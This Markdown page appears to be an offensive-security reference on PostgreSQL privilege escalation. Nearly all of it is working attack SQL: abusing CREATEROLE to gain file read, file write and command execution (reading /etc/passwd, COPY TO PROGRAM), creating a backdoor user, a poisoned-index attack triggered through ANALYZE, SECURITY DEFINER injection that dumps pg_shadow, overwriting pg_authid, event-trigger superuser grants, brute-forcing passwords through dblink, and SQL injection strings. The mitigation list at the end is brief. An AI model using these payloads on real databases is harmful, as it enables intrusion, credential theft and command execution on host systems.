---
title: Privilege Escalation
description: Techniques for escalating privileges in PostgreSQL
category: Advanced Techniques
order: 24
tags: ["privesc", "createrole", "security definer", "filenode"]
lastUpdated: 2025-12-14
---

## Privilege Escalation

PostgreSQL has several privilege escalation vectors that can be exploited to gain higher privileges within the database or on the underlying system.

### CREATEROLE Privilege Escalation

Users with `CREATEROLE` privilege can grant themselves dangerous roles, even without being superuser.

**Check for CREATEROLE:**

```sql
SELECT rolcreaterole FROM pg_roles WHERE rolname = current_user;
```

**Granting Dangerous Roles:**

```sql
-- Grant file read capability
GRANT pg_read_server_files TO current_user;

-- Grant file write capability
GRANT pg_write_server_files TO current_user;

-- Grant command execution capability
GRANT pg_execute_server_program TO current_user;

-- Now you can read files
SELECT pg_read_file('/etc/passwd');

-- Write files
COPY (SELECT 'malicious content') TO '/tmp/evil.txt';

-- Execute commands
COPY (SELECT '') TO PROGRAM 'id';
```

**Changing Other Users' Passwords:**

With `CREATEROLE`, you can change passwords of non-superuser accounts:

```sql
-- Change password of another user (non-superuser only)
ALTER USER target_user WITH PASSWORD 'new_password';

-- Create new user with login
CREATE USER backdoor WITH PASSWORD 'secret' LOGIN;
GRANT pg_read_server_files TO backdoor;
```

**Escalating to Superuser via Trust Auth:**

If local trust authentication exists:

```sql
-- First get command execution
GRANT pg_execute_server_program TO current_user;

-- Then execute psql as a trusted superuser to grant yourself superuser
COPY (SELECT '') TO PROGRAM 'psql -U postgres -c "ALTER USER attacker WITH SUPERUSER;"';
```

### ALTER TABLE Index Function Attack

This technique exploits how PostgreSQL handles index functions when `ANALYZE` runs with elevated privileges. Commonly used in managed PostgreSQL instances (GCP Cloud SQL, etc.).

**Requirements:**

- Ability to create tables and functions
- A superuser (or high-privilege user) that runs ANALYZE
- Ability to transfer table ownership

**Step 1: Create Table and Initial Function:**

```sql
-- Create a table
CREATE TABLE temp_attack (data TEXT);
INSERT INTO temp_attack VALUES ('dummy');

-- Create innocent-looking function
CREATE OR REPLACE FUNCTION innocent_func(TEXT) RETURNS TEXT
LANGUAGE sql IMMUTABLE AS 'SELECT ''safe''';

-- Create index using the function
CREATE INDEX idx_attack ON temp_attack (innocent_func(data));
```

**Step 2: Transfer Ownership to Superuser:**

```sql
-- Transfer table to superuser (requires specific permissions)
ALTER TABLE temp_attack OWNER TO postgres;
-- Or in managed instances:
ALTER TABLE temp_attack OWNER TO cloudsqladmin;
```

**Step 3: Replace Function with Malicious Version:**

```sql
-- Replace function with malicious version
CREATE OR REPLACE FUNCTION innocent_func(TEXT) RETURNS TEXT
LANGUAGE sql VOLATILE AS $$
    CREATE TABLE IF NOT EXISTS pwned (output TEXT);
    COPY pwned FROM PROGRAM 'id';
    SELECT 'done';
$$;
```

**Step 4: Trigger via ANALYZE:**

```sql
-- When superuser runs ANALYZE, function executes with their privileges
ANALYZE temp_attack;

-- Check results
SELECT * FROM pwned;
```

### SECURITY DEFINER Function Abuse

Functions marked `SECURITY DEFINER` execute with the privileges of the function owner, not the caller. Vulnerable functions can be exploited.

**Finding SECURITY DEFINER Functions:**

```sql
-- Find all SECURITY DEFINER functions
SELECT
    n.nspname AS schema,
    p.proname AS function_name,
    pg_get_userbyid(p.proowner) AS owner,
    p.prosecdef AS security_definer
FROM pg_proc p
JOIN pg_namespace n ON p.pronamespace = n.oid
WHERE p.prosecdef = true
AND n.nspname NOT IN ('pg_catalog', 'information_schema');
```

**Example Vulnerable Function:**

```sql
-- Vulnerable: accepts user input without sanitization
CREATE OR REPLACE FUNCTION get_user_data(username TEXT)
RETURNS TABLE(id INT, data TEXT)
SECURITY DEFINER
AS $$
BEGIN
    RETURN QUERY EXECUTE 'SELECT id, data FROM users WHERE name = ''' || username || '''';
END;
$$ LANGUAGE plpgsql;

-- Exploit via SQL injection in the function
SELECT * FROM get_user_data('admin'' UNION SELECT 1, passwd FROM pg_shadow--');
```

**Exploiting Path-Based Functions:**

```sql
-- If a SECURITY DEFINER function uses search_path unsafely
CREATE OR REPLACE FUNCTION admin_func()
RETURNS void SECURITY DEFINER AS $$
BEGIN
    -- Uses unqualified table name
    DELETE FROM audit_log WHERE age > 30;
END;
$$ LANGUAGE plpgsql;

-- Exploit: Create malicious table in attacker's schema
CREATE SCHEMA attacker;
CREATE TABLE attacker.audit_log AS SELECT * FROM pg_shadow;

-- Set search_path to use attacker's schema first
SET search_path TO attacker, public;

-- Now the function accesses attacker's table with owner's privileges
SELECT admin_func();
```

### Filenode Overwriting (pg_authid)

Advanced technique to directly modify the pg_authid system table by overwriting its physical filenode. Requires `pg_read_server_files` and `pg_write_server_files`.

**Step 1: Find pg_authid Filenode:**

```sql
-- Get filenode location
SELECT pg_relation_filenode('pg_authid');
SELECT pg_relation_filepath('pg_authid');
-- Example: base/1/1260
```

**Step 2: Download Filenode:**

```sql
-- Import filenode as large object
SELECT lo_import('/var/lib/postgresql/15/main/base/1/1260');
-- Returns OID

-- Read the content
SELECT lo_get(OID);
```

**Step 3: Modify Filenode:**

Use a hex editor or custom script to modify the raw filenode data. PostgreSQL provides built-in tools for filenode mapping:

- [`pg_relation_filenode()`](https://www.postgresql.org/docs/current/functions-admin.html#FUNCTIONS-ADMIN-DBOBJECT) - returns the filenode number for a relation
- [`pg_filenode_relation()`](https://www.postgresql.org/docs/current/functions-admin.html#FUNCTIONS-ADMIN-DBOBJECT) - returns the relation OID for a given filenode
- [`oid2name`](https://www.postgresql.org/docs/current/oid2name.html) - contrib utility that maps OIDs to table/filenode names

Modifications to pg_authid typically involve:

- Set `rolsuper = true`
- Set `rolcreaterole = true`
- Set `rolcreatedb = true`
- Modify password hash

**Step 4: Upload Modified Filenode:**

```sql
-- Create large object with modified content
SELECT lo_from_bytea(0, decode('MODIFIED_FILENODE_BASE64', 'base64'));

-- Export to overwrite original
SELECT lo_export(NEW_OID, '/var/lib/postgresql/15/main/base/1/1260');
```

**Step 5: Clear Caches:**

```sql
-- Force PostgreSQL to re-read system catalogs
-- May require reconnection or specific operations
SELECT pg_reload_conf();
```

### Event Trigger Privilege Escalation

Event triggers execute when certain DDL events occur. If you can create event triggers and a superuser performs an operation, you can escalate.

**Requirements:**

- Ability to create event triggers (requires superuser, but some extensions may grant this)
- Superuser performs DDL operation

**Creating Malicious Event Trigger:**

```sql
-- Create function to execute on DDL
CREATE OR REPLACE FUNCTION escalate_on_ddl()
RETURNS event_trigger
LANGUAGE plpgsql AS $$
BEGIN
    -- This executes with the privilege of whoever triggered the event
    IF current_user = 'postgres' THEN
        EXECUTE 'ALTER USER attacker WITH SUPERUSER';
    END IF;
END;
$$;

-- Create event trigger
CREATE EVENT TRIGGER escalate_trigger ON ddl_command_end
EXECUTE FUNCTION escalate_on_ddl();
```

**postgres_fdw Extension Exploitation:**

When postgres_fdw extension is upgraded by a superuser, there's a brief window of elevated privilege:

```sql
-- Create event triggers for extension operations
CREATE EVENT TRIGGER fdw_exploit ON ddl_command_start
WHEN TAG IN ('CREATE EXTENSION', 'ALTER EXTENSION')
EXECUTE FUNCTION create_backdoor();

CREATE EVENT TRIGGER fdw_exploit_end ON ddl_command_end
WHEN TAG IN ('CREATE EXTENSION', 'ALTER EXTENSION')
EXECUTE FUNCTION create_backdoor();
```

### Password Brute Force via PL/pgSQL

Use procedural language to brute force database passwords:

```sql
-- Create brute force function
CREATE OR REPLACE FUNCTION brute_force(target_user TEXT, wordlist TEXT[])
RETURNS TEXT
LANGUAGE plpgsql AS $$
DECLARE
    pwd TEXT;
    result TEXT;
BEGIN
    FOREACH pwd IN ARRAY wordlist LOOP
        BEGIN
            -- Try to connect with password
            PERFORM dblink_connect('host=127.0.0.1 dbname=postgres user=' ||
                                   target_user || ' password=' || pwd);
            PERFORM dblink_disconnect();
            RETURN 'Found: ' || pwd;
        EXCEPTION WHEN OTHERS THEN
            -- Password failed, continue
            NULL;
        END;
    END LOOP;
    RETURN 'Not found';
END;
$$;

-- Execute brute force
SELECT brute_force('admin', ARRAY['password', 'admin', '123456', 'postgres']);
```

### Exploiting Row Level Security (RLS) Bypass

Users with `BYPASSRLS` attribute can bypass row-level security policies:

```sql
-- Check for BYPASSRLS
SELECT rolname, rolbypassrls FROM pg_roles WHERE rolbypassrls = true;

-- If you can grant roles
GRANT pg_read_all_data TO current_user;  -- PostgreSQL 14+

-- Or create a function that bypasses RLS
CREATE OR REPLACE FUNCTION bypass_rls()
RETURNS SETOF secret_table
SECURITY DEFINER  -- Runs as owner who has BYPASSRLS
AS $$
    SELECT * FROM secret_table;
$$ LANGUAGE sql;
```

### Checking Escalation Opportunities

```sql
-- Check current privileges
SELECT
    rolname,
    rolsuper,
    rolcreaterole,
    rolcreatedb,
    rolcanlogin,
    rolbypassrls
FROM pg_roles
WHERE rolname = current_user;

-- Check dangerous role memberships
SELECT r.rolname AS role, m.rolname AS member
FROM pg_auth_members am
JOIN pg_roles r ON am.roleid = r.oid
JOIN pg_roles m ON am.member = m.oid
WHERE r.rolname IN ('pg_read_server_files', 'pg_write_server_files', 'pg_execute_server_program');

-- Check for SECURITY DEFINER functions you can call
SELECT proname, prosecdef, pg_get_userbyid(proowner) AS owner
FROM pg_proc
WHERE prosecdef = true;

-- Check event triggers
SELECT evtname, evtevent, evtowner::regrole
FROM pg_event_trigger;
```

### Injection Context Examples

```sql
-- Check if user has CREATEROLE
' UNION SELECT 1, rolcreaterole::text, 3 FROM pg_roles WHERE rolname=current_user--

-- Grant dangerous role (if CREATEROLE)
'; GRANT pg_execute_server_program TO current_user--

-- Find SECURITY DEFINER functions
' UNION SELECT 1, proname, 3 FROM pg_proc WHERE prosecdef=true--

-- Check for file roles
' UNION SELECT 1, pg_has_role(current_user, 'pg_read_server_files', 'member')::text, 3--
```

### Mitigation

- Avoid granting `CREATEROLE` to untrusted users
- Use `SECURITY INVOKER` instead of `SECURITY DEFINER` when possible
- Always use schema-qualified names in SECURITY DEFINER functions
- Restrict file operation roles (`pg_read_server_files`, etc.)
- Monitor role grants and privilege changes
- Review event triggers regularly
- Use parameterized queries in SECURITY DEFINER functions
